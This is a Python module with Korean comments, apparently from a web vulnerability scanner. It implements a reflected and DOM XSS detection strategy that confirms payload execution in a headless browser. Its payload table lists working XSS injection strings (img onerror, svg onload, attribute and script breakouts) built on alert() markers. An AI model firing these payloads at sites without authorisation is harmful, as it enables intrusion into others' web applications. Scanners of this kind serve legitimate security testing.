import asyncio
import hashlib
import random
import string
import threading
from html import escape as html_escape

import requests

from fbs.inference.models import AttackSurface, VulnResult
from fbs.inference.waf import classify_waf_block
from fbs.inference.strategies.base import BaseStrategy

"""
Reflected XSS strategy.

web_scanner/pipelines/xss.py(Scrapy 콜백 체인)의 '탐지 로직'만 가져오고 배관은
FBS 추론 엔진(동기 requests.Session + AttackSurface + VulnResult)에 맞춰 새로 썼다.

설계 철학: "반사됐다 ≠ 취약하다. 실행을 증명하라."
  정적 추정 대신 측정으로, 최종 판정은 실제 브라우저 실행(alert 발화)으로 한다.

반사 여부·반사 컨텍스트·꺾쇠 생존은 recon(DBDetect.probe_reflection)이 이미 측정해
surface.extra['reflection']에 실어 둔다 — 반사 검사는 스캐너 전체에서 recon 한 곳으로
통일됐고(SQLi 등 다른 전략도 blind 판정에 공용으로 쓴다), XSS는 그 신호를 받아 쓴다.

탐지 파이프라인(표면 1개):
  ① reflection 신호 소비 → 반사 안 됐으면 종료(반사형 XSS 아님)
  ② 페이로드 선택 → (컨텍스트 ∩ 생존 문자)에 맞는 것만 — breakout 불가한 건 안 쏨
  ③ raw 반사 확인 → 실행 시그니처(exec_sig)가 이스케이프 없이 그대로 박혔는가
  ④ 브라우저 실행 → alert(marker) 실제 발화 → HIGH / 미발화 → MEDIUM

recon이 '<'가 전부 &lt;로 치환됨을 이미 쟀으면, ②에서 태그 주입 페이로드를 아예
발사하지 않는다(요청 수·대상 소음·오탐 감소). 단 recon은 SQL을 깨지 않으려 꺾쇠(<,>)만
재므로, 따옴표(',") 생존은 ③에서 페이로드를 실제로 쏴 exec_sig로 확인한다.

마커:
  모든 토큰은 self-describing이다 — prefix + 표면태그(url/method/param 해시 6자리)
  + nonce(4자리). 전부 영숫자라 어떤 컨텍스트에서도 리터럴로 생존하고, 발견된
  마커만으로 '어느 표면에서 왔는지'를 식별할 수 있다. 실행 마커는 _markers
  레지스트리에 (마커 → 주입점)으로 기록된다 — 지금은 반사형 귀속/진단용이지만,
  주입점≠반사점인 stored XSS에서 역추적의 토대가 된다.

확정 단계:
  - 브라우저에서 alert(marker) 실제 발화 → HIGH (실행 확정)
  - raw 반사는 됐지만 브라우저 미가용/미발화 → MEDIUM (반사 확인, 실행 미확정)

DOM 반사도 처리한다: recon이 원본 HTML에서 'URL 소스→innerHTML 등 싱크' 패턴을 찾아
reflection.dom_suspect를 세우면(서버 반사 X), 서버 raw 확인을 건너뛰고 html 페이로드를
브라우저로 직접 확정한다(브라우저가 JS를 돌려 실제 실행을 관측하므로 DOM/서버 구분 불필요).

아직 안 하는 것(TODO, 의도적으로 범위 밖):
  - Stored XSS(전 표면 마커 주입 → 크롤 스윕 → 레지스트리 역추적 → 실행 확인)
  - DOM 소스→싱크 '데이터플로우 추적'(지금은 소스·싱크 공존만 보는 휴리스틱)
  - XSS 전용 WAF 우회(EVASION_TRANSFORMS는 SQL 키워드용이라 XSS엔 부적합)
  - blind/봇 XSS(OOB 콜라보레이터 필요)
"""


class XSSStrategy(BaseStrategy):

    VULN_TYPE = 'xss'
    TIMEOUT = 10
    # 브라우저에서 폼 제출 후 alert/네비게이션을 기다리는 시간(ms).
    BROWSER_WAIT_MS = 1500

    # 실행 확인용 마커 prefix. 실제 마커 = prefix + 표면태그(6) + nonce(4), 전부 영숫자.
    _MARKER_PREFIX = 'fbsxm'

    # 컨텍스트별 페이로드 택소노미. {M}=실행 확인용 마커(영숫자).
    #   payload   : 필드에 실제로 넣을 문자열
    #   exec_sig  : 이 문자열이 '이스케이프되지 않고' 응답에 그대로 박혔는지 확인할 핵심
    #               실행 시그니처(verbatim 매칭). 서버가 <,>,",' 중 하나라도 엔티티로
    #               바꾸면 이 시그니처가 깨져 매칭 실패 → raw 반사 아님으로 본다.
    #   requires  : 이 페이로드가 breakout에 반드시 필요로 하는 메타문자 집합.
    #               recon이 측정한 생존 문자(tested ∩ requires)에 죽은 게 있으면 발사 전
    #               스킵한다. recon은 꺾쇠(<,>)만 재므로 따옴표 요구는 ③ exec_sig로 거른다.
    # alert 따옴표는 컨텍스트 breakout 따옴표와 겹치지 않게 고른다.
    _CONTEXT_PAYLOADS: dict[str, list[tuple[str, str, frozenset]]] = {
        # 태그 사이 텍스트 — 바로 태그 주입
        'html': [
            ("<img src=x onerror=alert('{M}')>", "<img src=x onerror=alert('{M}')", frozenset({'<', '>'})),
            ("<svg/onload=alert('{M}')>",        "<svg/onload=alert('{M}')",        frozenset({'<', '>'})),
        ],
        # 겹따옴표 속성값 — "> 로 빠져나옴 (alert는 홑따옴표)
        'attr_double': [
            ('"><img src=x onerror=alert(\'{M}\')>', "<img src=x onerror=alert('{M}')", frozenset({'"', '<', '>'})),
        ],
        # 홑따옴표 속성값 — '> 로 빠져나옴 (alert는 겹따옴표)
        'attr_single': [
            ("'><img src=x onerror=alert(\"{M}\")>", '<img src=x onerror=alert("{M}")', frozenset({"'", '<', '>'})),
        ],
        # 따옴표 없는 속성값 — 새 이벤트 핸들러 + autofocus로 상호작용 없이 발화
        'attr_unquoted': [
            (" autofocus onfocus=alert('{M}') x=", "onfocus=alert('{M}')", frozenset({"'"})),
        ],
        # <script> 내부 — </script>로 스크립트를 닫고 태그 주입(가장 견고)
        'js': [
            ("</script><img src=x onerror=alert('{M}')>", "<img src=x onerror=alert('{M}')", frozenset({'<', '>'})),
            ("';alert('{M}');//",                          "alert('{M}')",                   frozenset({"'"})),
        ],
        # HTML 주석 내부 — -->로 주석을 닫고 태그 주입
        'comment': [
            ("--><img src=x onerror=alert('{M}')>", "<img src=x onerror=alert('{M}')", frozenset({'<', '>'})),
        ],
    }

    def __init__(self, session: requests.Session | None = None):
        self.session = session or requests.Session()
        # Playwright 가용 여부를 프로세스 단위로 한 번만 판정해 캐싱(매번 import 시도 안 함).
        self._browser_available: bool | None = None
        # 마커 레지스트리: {실행 마커 → {url, method, param, context, payload}}.
        # 반사형에선 귀속/진단용, stored에선 역추적의 토대.
        self._markers: dict[str, dict] = {}

    # ── BaseStrategy 인터페이스 ──────────────────────────────────────────────

    def can_handle(self, surface: AttackSurface) -> bool:
        if surface.surface_type not in ('form_field', 'url_param', 'hidden_param', 'api_field'):
            return False
        # JSON 프록시 폼은 반사형 XSS 대상이 아님(응답에 HTML로 반사되지 않음)
        if surface.extra.get('proxy_template'):
            return False
        hints = surface.extra.get('hints', {})
        if hints.get('xss', 0.0) > 0:
            return True
        # 필드명 힌트가 없어도, recon의 반사 프로브가 'HTML 메타문자(<,>)가 이스케이프
        # 없이 반사됨'을 관측했으면(reflects_html) XSS 전제가 충족된 것 — 이건 단순 반사
        # (SQLi 등도 반사함)와 달리 XSS에 특정적인 신호라, 여기서만 동작을 시작해 과도
        # 트리거를 막는다. param/memo처럼 이름만으론 아무 힌트도 못 받는 진짜 반사형
        # 싱크(/vuln?param=)를 이 경로로 잡는다.
        if surface.extra.get('reflects_html'):
            return True
        return False

    def priority(self, surface: AttackSurface) -> float:
        """XSS 우선순위 — profiler의 xss hint 점수를 쓰되, 필드명 힌트가 없어도 메타문자가
        이스케이프 없이 반사되면(reflects_html) XSS가 사실상 확정적이므로 강한 점수(0.7)로
        올린다. 엔진은 이 값과 다른 전략(예: SQLi의 sqli hint)을 비교해 더 높은 하나만 돌린다
        — 그래서 반사되지 않는 로그인 필드(sqli 0.8 > xss 0.4)에선 XSS가 아예 시작되지 않는다."""
        base = surface.extra.get('hints', {}).get('xss', 0.0)
        if surface.extra.get('reflects_html'):
            return max(base, 0.7)
        return base

    def run(self, surface: AttackSurface) -> list[VulnResult]:
        # ① recon이 측정한 반사 신호 소비 — 반사 검사는 스캐너 전체에서 recon 한 곳으로 통일.
        refl = surface.extra.get('reflection') or {}
        server_reflected = bool(refl.get('reflected'))
        dom = bool(refl.get('dom_suspect'))
        if not server_reflected and not dom:
            print("    [XSS] 서버 반사도 DOM 싱크도 없음 — 반사형/DOM XSS 아님 (stored는 범위 밖)")
            return []

        if server_reflected:
            contexts = refl.get('contexts') or ['html']
            survived = set(refl.get('survived') or [])
            tested   = set(refl.get('tested') or [])
            shown = ' '.join(c for c in ('<', '>') if c in survived) or '없음'
            print(f"    [XSS] 서버 반사 확인(recon) — 컨텍스트: {', '.join(sorted(set(contexts)))} / 꺾쇠 생존: {shown}")
        else:
            # DOM 반사: 서버 HTML엔 안 보이고 JS가 브라우저에서 주입(innerHTML 등). 서버 측정이
            # 없으니 프루닝/raw-반사 확인을 건너뛰고, html 컨텍스트 페이로드를 브라우저로 직접 확정한다.
            contexts = ['html']
            survived = set()
            tested   = set()
            print(f"    [XSS] DOM 싱크 반사 의심({refl.get('dom_source')}→{refl.get('dom_sink')}) "
                  f"— 서버 반사 없음, 브라우저로 직접 확인")

        base_fields = self._base_fields(surface)

        # baseline — 마커가 원래 페이지에 이미 있었는지 확인용(사전존재 오탐 방지)
        status, baseline_body, _ = self._send(surface, dict(base_fields))
        if status is None:
            baseline_body = ''

        # ② 컨텍스트별 페이로드 → ③ (서버 반사면 raw 반사 확인 / DOM이면 바로 브라우저 후보)
        candidates = []  # [{context, payload, marker, fields}]
        for ctx in sorted(set(contexts)):
            for template, sig_template, requires in self._CONTEXT_PAYLOADS.get(ctx, []):
                # 발사 전 프루닝: recon이 '측정한'(tested) 문자 중 breakout 필요문자가 죽었으면
                # 스킵. DOM은 tested가 비어 있어 프루닝이 걸리지 않는다.
                dead = (requires & tested) - survived
                if dead:
                    print(f"      · {ctx}: breakout 필요문자({''.join(sorted(dead))}) 이스케이프됨 — 발사 전 스킵")
                    continue
                marker = self._new_token(surface, self._MARKER_PREFIX)
                if marker in baseline_body:
                    continue  # 극히 드문 충돌 — 안전하게 스킵
                payload = template.format(M=marker)
                exec_sig = sig_template.format(M=marker)
                cand = {
                    'context': ctx,
                    'payload': payload,
                    'marker': marker,
                    'fields': {**base_fields, surface.param: payload},
                }

                if not server_reflected:
                    # DOM: 서버 응답엔 안 보이므로 raw 확인 없이 바로 브라우저 후보로(실행이 확정).
                    print(f"      · {ctx}: DOM 후보 등록 — 브라우저 실행 확인 대기")
                    self._register_marker(surface, marker, ctx, payload)
                    candidates.append(cand)
                    continue  # html의 img/svg 둘 다 시도(브라우저가 전부 확인)

                # 서버 반사: 응답에 실행 시그니처가 이스케이프 없이 박혔는지 확인
                p_status, p_body, _ = self._send(surface, {**base_fields, surface.param: payload})
                if p_status is None:
                    continue
                blocked, waf_name, _ = classify_waf_block(p_status, p_body)
                if blocked:
                    print(f"      · {ctx}: 차단됨({waf_name}) — XSS 전용 우회는 미구현, 스킵")
                    continue
                if exec_sig in p_body:
                    print(f"      · {ctx}: raw 반사 확인 (실행 시그니처 원형 유지)")
                    self._register_marker(surface, marker, ctx, payload)
                    candidates.append(cand)
                    break  # 컨텍스트당 첫 성공 페이로드 하나면 충분
                else:
                    print(f"      · {ctx}: 반사됐으나 이스케이프됨(실행 불가) — 정탐 아님")

        if not candidates:
            print("    [XSS] 실행 가능한 후보 없음 — 취약점 아님")
            return []

        # ④ 브라우저로 실제 실행(alert 발화) 확인
        fired = self._run_browser_confirm(surface, candidates)

        if fired is None:
            # Playwright 미가용 — raw 반사까지만 확인됨
            best = candidates[0]
            print("    [XSS] Playwright 미설치 — 실행 확정 불가, 반사 근거로 MEDIUM 보고")
            return [self._make_result(surface, best, confirmed=False,
                                       note='Playwright 미설치로 실행 미확정')]

        for cand in candidates:
            if fired.get(cand['marker']):
                print(f"    [XSS] 브라우저 실행 확정 — alert('{cand['marker']}') 발화 ({cand['context']})")
                return [self._make_result(surface, cand, confirmed=True,
                                           alert_msg=fired[cand['marker']])]

        # raw 반사는 됐지만 브라우저에서 발화 안 함(CSP 등 가능성)
        best = candidates[0]
        print("    [XSS] raw 반사 확인됐으나 브라우저 실행 미관측(CSP 등 가능) — MEDIUM 보고")
        return [self._make_result(surface, best, confirmed=False,
                                   note='raw 반사 확인, 브라우저 실행 미관측(CSP 등 가능)')]

    # ── 요청 전송 ────────────────────────────────────────────────────────────

    def _base_fields(self, surface: AttackSurface) -> dict:
        """target 필드와 함께 보낼 나머지 필드의 기본값(SQLiStrategy._base_fields와 동일 규칙)."""
        if surface.surface_type == 'url_param':
            raw = (surface.page or {}).get('params') or {}
            data = {k: (v[0] if isinstance(v, list) and v else 'test') for k, v in raw.items()}
        else:
            data = dict(surface.extra.get('all_params') or {})
        data.setdefault(surface.param, 'test')
        return data

    def _send(self, surface: AttackSurface, data: dict, timeout: int | None = None):
        """(status, body, elapsed) — 실패 시 (None, '', 0.0)."""
        import time
        timeout = timeout or self.TIMEOUT
        enctype = surface.extra.get('enctype') or ''
        start = time.monotonic()
        try:
            if surface.method == 'GET':
                resp = self.session.get(surface.url, params=data, timeout=timeout)
            elif 'application/json' in enctype:
                resp = self.session.request(surface.method, surface.url, json=data, timeout=timeout)
            else:
                resp = self.session.request(surface.method, surface.url, data=data, timeout=timeout)
            return resp.status_code, resp.text, time.monotonic() - start
        except Exception:
            return None, '', time.monotonic() - start

    # ── 마커 ─────────────────────────────────────────────────────────────────

    def _surface_tag(self, surface: AttackSurface) -> str:
        """표면(url/method/param)에 대한 안정적인 6자리 16진 태그 — 같은 표면은 항상
        같은 태그를 받는다. 마커에 심어 '어느 표면발(發) 반사인지'를 식별하는 데 쓴다."""
        raw = f"{surface.method} {surface.url} {surface.param}"
        return hashlib.md5(raw.encode('utf-8', 'replace')).hexdigest()[:6]

    def _new_token(self, surface: AttackSurface, prefix: str) -> str:
        """self-describing 토큰 = prefix + 표면태그(6) + nonce(4). 전부 영숫자라
        어떤 컨텍스트에서도 이스케이프/인코딩 없이 리터럴로 생존한다."""
        nonce = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        return f"{prefix}{self._surface_tag(surface)}{nonce}"

    def _register_marker(self, surface: AttackSurface, marker: str,
                         context: str, payload: str) -> None:
        """실행 마커를 (마커 → 주입점)으로 레지스트리에 기록. 반사형에선 귀속/진단용,
        stored에선 반사점에서 발견한 마커로 주입점을 역추적하는 토대."""
        self._markers[marker] = {
            'url': surface.url,
            'method': surface.method,
            'param': surface.param,
            'context': context,
            'payload': payload,
        }

    # ── 브라우저 실행 확인 (Playwright) ───────────────────────────────────────

    def _run_browser_confirm(self, surface: AttackSurface, candidates: list) -> dict | None:
        """후보 페이로드들을 실제 브라우저에서 제출해 alert 발화를 확인한다.

        반환: {marker: alert_message} (발화한 것만). Playwright 미가용이면 None.

        Windows에서 chromium subprocess를 띄우려면 ProactorEventLoop가 필요한데,
        추론 엔진은 동기(메인 스레드) 흐름이라 전용 스레드에서 자체 이벤트 루프를
        돌린다(옛 web_scanner xss.py의 stored 확인 패턴을 그대로 재활용)."""
        holder: dict = {}

        def worker():
            try:
                from playwright.async_api import async_playwright  # noqa: F401
            except ImportError:
                holder['unavailable'] = True
                return
            if hasattr(asyncio, 'ProactorEventLoop'):
                loop = asyncio.ProactorEventLoop()
            else:
                loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                holder['result'] = loop.run_until_complete(
                    self._browser_confirm(surface, candidates))
            except Exception as e:
                holder['error'] = e
            finally:
                loop.close()

        t = threading.Thread(target=worker)
        t.start()
        t.join()

        if holder.get('unavailable'):
            return None
        if 'error' in holder:
            print(f"    [XSS] 브라우저 확인 중 오류: {holder['error']} — 반사 근거로만 보고")
            return {}
        return holder.get('result', {})

    async def _browser_confirm(self, surface: AttackSurface, candidates: list) -> dict:
        from playwright.async_api import async_playwright

        fired: dict = {}
        cookies = self._browser_cookies(surface.url)

        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=True)
            context = await browser.new_context()
            if cookies:
                try:
                    await context.add_cookies(cookies)
                except Exception:
                    pass
            page = await context.new_page()

            current = {'marker': None}

            async def on_dialog(dialog):
                # alert('marker')의 메시지가 우리 마커와 같으면 그 페이로드가 실행된 것
                if current['marker'] is not None and dialog.message == current['marker']:
                    fired[current['marker']] = dialog.message
                try:
                    await dialog.dismiss()
                except Exception:
                    pass

            page.on('dialog', on_dialog)

            for cand in candidates:
                current['marker'] = cand['marker']
                html = self._auto_submit_form(surface, cand['fields'])
                try:
                    await page.set_content(html)
                    await page.wait_for_timeout(self.BROWSER_WAIT_MS)
                except Exception:
                    pass

            await browser.close()
        return fired

    def _browser_cookies(self, url: str) -> list[dict]:
        """추론 세션의 쿠키를 Playwright 컨텍스트에 심을 형태로 변환한다 —
        로그인/세션이 필요한 앱에서도 크롤링 때와 같은 인증 상태로 확인하기 위함."""
        out = []
        for c in self.session.cookies:
            if c.name:
                out.append({'name': c.name, 'value': c.value or '', 'url': url})
        return out

    def _auto_submit_form(self, surface: AttackSurface, fields: dict) -> str:
        """target URL로 자동 제출되는 폼 HTML을 만든다. GET/POST 동일하게 처리되고,
        input value는 html-escape해서 넣으므로 브라우저가 디코딩해 '원형 페이로드'를
        그대로 전송한다(이중 인코딩 방지)."""
        method = 'POST' if surface.method != 'GET' else 'GET'
        inputs = ''.join(
            f'<input name="{html_escape(str(k), quote=True)}" '
            f'value="{html_escape(str(v), quote=True)}">'
            for k, v in fields.items()
        )
        action = html_escape(surface.url, quote=True)
        return (
            f'<!doctype html><html><body>'
            f'<form id="fbsf" method="{method}" action="{action}">{inputs}</form>'
            f'<script>document.getElementById("fbsf").submit();</script>'
            f'</body></html>'
        )

    # ── 결과 생성 ────────────────────────────────────────────────────────────

    def _make_result(self, surface: AttackSurface, cand: dict,
                     confirmed: bool, alert_msg: str | None = None,
                     note: str | None = None) -> VulnResult:
        severity = 'HIGH' if confirmed else 'MEDIUM'
        if confirmed:
            evidence = f"브라우저에서 alert('{cand['marker']}') 실제 발화 — 컨텍스트 {cand['context']}"
        else:
            evidence = f"응답에 실행 시그니처가 이스케이프 없이 반사됨 — 컨텍스트 {cand['context']}"
            if note:
                evidence += f" ({note})"
        return VulnResult(
            surface=surface,
            vuln_type='XSS',
            severity=severity,
            payload=cand['payload'],
            evidence=evidence,
            detail={
                'context': cand['context'],
                'marker': cand['marker'],
                'surface_tag': self._surface_tag(surface),
                'confirmed_by': 'browser' if confirmed else 'reflection',
                'alert_message': alert_msg,
                'note': note,
            },
        )
